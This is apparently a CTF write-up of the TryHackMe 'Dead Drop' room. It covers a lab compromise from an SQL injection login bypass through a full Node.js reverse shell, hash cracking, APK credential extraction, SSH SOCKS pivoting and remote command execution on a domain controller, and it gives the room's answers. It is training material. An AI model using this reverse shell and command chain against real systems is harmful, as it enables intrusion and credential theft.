<img width="1772" height="247" alt="image" src="https://github.com/user-attachments/assets/fcffbf65-62f0-49d6-9f53-0e5359c59b17" />

# TryHackMe - Dead Drop Write-up

<br>

Web server / DMZ: directly accessible from VPN
Internal LAN: 192.168.11.0/24

Internal hosts shown:
- DEADDROP-DC → 192.168.11.100
- DEADDROP-WRK → 192.168.11.51
- WebServer → 192.168.11.200

So first goal: compromise the web server and get SSH creds.

### Start with nmap:

```nmap -sC -sV -Pn -oN deaddrop-web.nmap 192.168.11.200```

<img width="1349" height="416" alt="image" src="https://github.com/user-attachments/assets/9812f013-dc88-48ae-b0c4-e03dfce32528" />
<br>

Web server is simple:

```
22 SSH
80 Node.js Express app
/login
```

So first target is the Node.js. SSH password likely comes from web exploit/leak. 🧭

In browser, open:
```
http://192.168.11.200/login
```

<img width="1358" height="864" alt="image" src="https://github.com/user-attachments/assets/11b6d74a-1f4a-45bc-9428-47d8771b9794" />
<br>

Then test common auth bypasses:

Payload used:
```
username=admin'--&password=x
```
<img width="1370" height="856" alt="image" src="https://github.com/user-attachments/assets/55dca5c1-8e63-4a96-aa8f-fa6f78451cc4" />

<img width="1898" height="863" alt="image" src="https://github.com/user-attachments/assets/d4bcc6a1-fad1-4760-8cbf-edfa840c107c" />

<br>

That confirms SQL injection login bypass worked ✅

Meaning the backend query is probably something like:

```
SELECT * FROM users WHERE username = 'admin'--' AND password = 'x'
```

The `--` comments out the password check, so you are logged in as admin.

## Notes on Testing

I also tested a few other possibilities before finding the working path. Path traversal in the preview and rename functions did not work because the application appeared to sanitize filenames and strip directory traversal characters. SSTI payloads were also displayed as plain text, so the preview page was not evaluating template syntax.

Since the server was running Node.js Express, this helped narrow the path toward using a Node.js reverse shell payload instead.

## Getting a Reverse Shell

While checking the uploaded files, I noticed there was already a JavaScript reverse shell file in the file manager. This was a useful hint that JavaScript files might be executed by the preview function. Instead of using the existing file directly, I used my own `rev.js` payload with my VPN IP and listener port.

For a Node.js reverse shell, create rev.js with your VPN IP:

```
(function(){
  var net = require("net"),
      cp = require("child_process"),
      sh = cp.spawn("/bin/sh", []);
  var client = new net.Socket();
  client.connect(4444, "YOUR_VPN_IP", function(){
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
  });
})();
```

Start a Listener:

```bash
nc -lvnp 4444
```

I then uploaded rev.js through the file manager. After the file appeared in the dashboard, I clicked Preview on the uploaded file. This triggered the JavaScript file on the server side and caused the target to connect back to my listener.

Once the connection came in, I confirmed the shell:

<img width="1346" height="158" alt="image" src="https://github.com/user-attachments/assets/9d0ab6bc-bb64-408e-8103-62542425a740" />

<br>

```bash
whoami
```
The shell was running as the node user, which confirmed code execution through the uploaded Node.js reverse shell. I also found a database.

<img width="1349" height="506" alt="image" src="https://github.com/user-attachments/assets/af4a5fb2-9f17-45bb-b6d8-78863a9afc26" />

<img width="1357" height="224" alt="image" src="https://github.com/user-attachments/assets/fad27f82-de1e-496e-aa4a-2ea7710ba47e" />

<br>

sqlite3 is not installed on the target, but that’s okay. We have a another options.

first run 
```
cat package.json
```
— that will tell us the exact DB library.

<img width="1348" height="468" alt="image" src="https://github.com/user-attachments/assets/48e16bfd-727e-491d-9915-98931306b793" />

<br>

It uses better-sqlite3, not sqlite3.

Run this from `/opt/app`:

```bash
node -e "const Database=require('better-sqlite3'); const db=new Database('./db/deaddrop.db'); console.log(db.prepare(\"SELECT name FROM sqlite_master WHERE type='table'\").all());"
```

Then dump all tables automatically:

```bash
node -e "const Database=require('better-sqlite3'); const db=new Database('./db/deaddrop.db'); const tables=db.prepare(\"SELECT name FROM sqlite_master WHERE type='table'\").all().map(x=>x.name); for (const t of tables){ console.log('\n### '+t); console.log(db.prepare('SELECT * FROM '+t).all()); }"
```

<img width="1358" height="374" alt="image" src="https://github.com/user-attachments/assets/3ec5da98-3eee-4851-856f-f7003d0f49b8" />

<br>

Turned out these DB creds don’t work for SSH, they are probably web app creds only. The SSH password answer is somewhere else.

So I went back to the rev shell and found a file that is very sus: `shadow.bak`

<img width="1350" height="246" alt="image" src="https://github.com/user-attachments/assets/92c71880-e8a7-4baf-9924-19bb386be57d" />

That’s a Linux shadow hash for svc-drop. `$6$` means SHA-512 crypt, usually John can crack it.

Hash Cracking time:

<img width="1344" height="252" alt="image" src="https://github.com/user-attachments/assets/dd83ca1b-2435-47ee-98fb-c9412f51cb11" />

Niceee 🔥 First answer confirmed.

Next, continue from the svc-drop SSH shell.

<img width="1350" height="435" alt="image" src="https://github.com/user-attachments/assets/38bfb9b0-52fb-4442-8ab8-58d5ec087f55" />

There was a apk file, it is likely the answer for second question. I transferred the APK to my Kali machine using scp.

From Kali, pull it over SSH. Password is the one you cracked.

```
scp svc-drop@192.168.11.200:/home/svc-drop/backup/deaddrop-mobile.apk .
```

To inspect the application, I opened the APK with jadx-gui:

`jadx-gui /YOUR-PATH-TO/deaddrop-mobile.apk`

<img width="1599" height="822" alt="image" src="https://github.com/user-attachments/assets/de126ae9-24e1-4c4e-a822-c7dfc1070203" />
<br>

Inside JADX, I searched for keywords such as username, password, login, and auth. The application contained hardcoded credentials, which were used later for Active Directory access:

<img width="1308" height="663" alt="image" src="https://github.com/user-attachments/assets/4b39a003-e96b-4578-9e93-4593031bbfe9" />

<img width="1122" height="656" alt="image" src="https://github.com/user-attachments/assets/bd929846-e6fa-4066-b9b2-1f44c1a58a46" />

<br>

That was answer for the second question. 

## Pivoting to the Internal Network

After extracting the mobile application credentials, I tried to authenticate to the domain controller at `192.168.11.100` using the discovered account.

However, the domain controller was not directly reachable from my Kali machine. This made sense because the network diagram showed that the domain controller was part of the internal LAN, while my initial access was only to the DMZ web server.

To confirm this, I tested connectivity to the domain controller and noticed that direct access from Kali did not work. 

<img width="926" height="404" alt="image" src="https://github.com/user-attachments/assets/5c77b81d-d6ed-4b03-9722-f487f41d5089" />

<br>

Since I already had SSH access to the web server as `svc-drop`, I used it as a pivot point by creating a SOCKS proxy:

```bash
ssh -N -D 9050 svc-drop@192.168.11.200
```
Leave that terminal open. It will look like it’s doing nothing — that’s normal.

<img width="1349" height="199" alt="image" src="https://github.com/user-attachments/assets/26f0cad0-3be1-46ab-ae25-13cc4a40a944" />

<br>

This opened a SOCKS proxy on my Kali machine through the compromised web server. 

Next I test DC through proxy, I used `proxychains` to route internal enumeration tools through the pivot:

```bash
proxychains nxc smb 192.168.11.100 -u j.harris -p 'DropsOfJupiter2026!'
```

<img width="1348" height="783" alt="image" src="https://github.com/user-attachments/assets/42bf8500-5623-45c1-9e79-a5f0c36456f7" />

<br>

This allowed me to reach the domain controller through the web server and confirmed that the domain credentials were valid.

Meaning:

- SOCKS pivot through svc-drop works
- DC 192.168.11.100 is reachable through proxychains
- j.harris is valid domain user
- Pwn3d! means this user has local admin access on that target or strong SMB access, depending on tool context

Now enumerate:
```
proxychains nxc smb 192.168.11.100 -u j.harris -p 'DropsOfJupiter2026!' --shares
```
<img width="1344" height="466" alt="image" src="https://github.com/user-attachments/assets/0d4cf7f4-de21-413c-8a8c-80c7c64317b4" />

<br>

Try command execution:

```
proxychains nxc smb 192.168.11.100 -u j.harris -p 'DropsOfJupiter2026!' -x whoami
```

<img width="1339" height="391" alt="image" src="https://github.com/user-attachments/assets/60ec8e34-3ef9-491e-9bc7-567f2545bf3a" />

<br>

You’re basically admin on the DC already via j.harris and j.harris can execute commands on the DC.

For the next two questions, i tried to run:
```
proxychains nxc smb 192.168.11.100 -u j.harris -p 'DropsOfJupiter2026!' -x "whoami /groups"
```
<img width="1348" height="795" alt="image" src="https://github.com/user-attachments/assets/be7e22b1-2d90-4853-b2fd-76338fb2fe05" />

<br>

Imporatant lines from that messy output:

```text
DEADDROP\Domain Admins
DEADDROP\ITSupport-Admins
```

So the group target is very likely:

```text
ITSupport-Admins
```

But for the question:

> What Active Directory permission does your domain account hold that can be abused?

We need BloodHound/ACL info, not `whoami /groups`.

Run this:

```bash
proxychains bloodhound-python \
-u j.harris \
-p 'DropsOfJupiter2026!' \
-d deaddrop.loc \
-ns 192.168.11.100 \
-dc DEADDROP-DC.deaddrop.loc \
-c All \
--dns-tcp
```

<img width="1350" height="799" alt="image" src="https://github.com/user-attachments/assets/4c30128f-23e7-4cdc-9ab7-e7ce7f64600e" />
<br>

BloodHound collected most/all AD data and should have created JSON files in your current folder.

Then start BloodHound and import them:
```
bloodhound-start
```

BloodHound UI usually opens separately after the start script. Once it opens, log in, import the JSON files from your current folder, then search `j.harris`.

Click the `J.HARRIS@DEADDROP.LOC` node.

<img width="1908" height="817" alt="image" src="https://github.com/user-attachments/assets/11d2b56c-ef02-448c-a6a9-6d29d84be3cd" />

<br>

Yep Now we got the answer for third question which is `ITSUPPORT-ADMINS`

For the permission question, Go to Pathfinding; Set Start Node: `J.HARRIS@DEADDROP.LOC` and Set End Node: `DOMAIN ADMINS@DEADDROP.LOC`. 

<img width="1911" height="824" alt="image" src="https://github.com/user-attachments/assets/67e42eb7-d712-4208-83e8-ce25b8624366" />

<br>

Look at the label on the line between nodes. The answer is `AddMember`.

### The final question 
> What is the flag on the Domain Controller?

I went back to proxychains and run:

```
proxychains nxc smb 192.168.11.100 -u j.harris -p 'DropsOfJupiter2026!' -x "dir C:\Users\Administrator\Desktop"
```

<img width="1344" height="604" alt="image" src="https://github.com/user-attachments/assets/0b92e51c-2087-4834-9de5-e9cd53e2fab3" />

<br>

Then:

```
proxychains nxc smb 192.168.11.100 -u j.harris -p 'DropsOfJupiter2026!' -x "type C:\Users\Administrator\Desktop\flag.txt"
```

<img width="1346" height="405" alt="image" src="https://github.com/user-attachments/assets/127a8b87-edda-4579-aeb8-89cc760a0272" />

<br>

Grabbed the final flag and finished the room 🔥

## Attack Chain

The room started with a web-facing Node.js Express file-sharing application on the DMZ web server.

1. Performed initial enumeration and found SSH and HTTP open on the web server.
2. Accessed the login page and bypassed authentication using SQL injection.
3. Reached the file manager dashboard and reviewed the upload/preview functionality.
4. Noticed existing reverse shell-style files and confirmed that PHP files were not executed because the application was running Node.js.
5. Uploaded a Node.js reverse shell file and clicked **Preview** to trigger it, gaining a shell as the `node` user.
6. Enumerated the application directory and found a SQLite database and a backup shadow file.
7. Extracted the `svc-drop` hash from `shadow.bak` and cracked it with John, obtaining SSH access to the web server.
8. Found an Android APK backup in the `svc-drop` home directory.
9. Opened the APK with JADX-GUI and found hardcoded domain credentials.
10. Confirmed that the domain controller was not directly reachable from Kali, so I created a SOCKS proxy through the compromised web server.
11. Used `proxychains` with NetExec to authenticate to the internal domain controller.
12. Collected BloodHound data through the pivot and identified that `j.harris` had the `AddMember` permission over `ITSupport-Admins`.
13. Identified `ITSupport-Admins` as the privilege escalation target.
14. Used the domain access to execute commands on the domain controller and read the Administrator desktop flag.

## Key Takeaways

* SQL injection can be useful beyond simply bypassing login; it can open access to more dangerous functionality.
* File upload alone does not always mean code execution. The important part was finding how to trigger the uploaded file.
* Matching the payload to the backend technology matters. PHP did not execute because the server was Node.js, so a Node.js reverse shell was the correct direction.
* Backup files are high-value targets. The `shadow.bak` file exposed a password hash that led to SSH access.
* APK files can contain hardcoded internal credentials and are worth reversing during enumeration.
* When internal hosts are not directly reachable, SSH dynamic port forwarding with `proxychains` is a useful pivoting method.
* BloodHound is very helpful for understanding AD privilege escalation paths, especially ACL-based permissions like `AddMember`.
* The final compromise came from chaining multiple smaller findings together instead of relying on a single vulnerability.


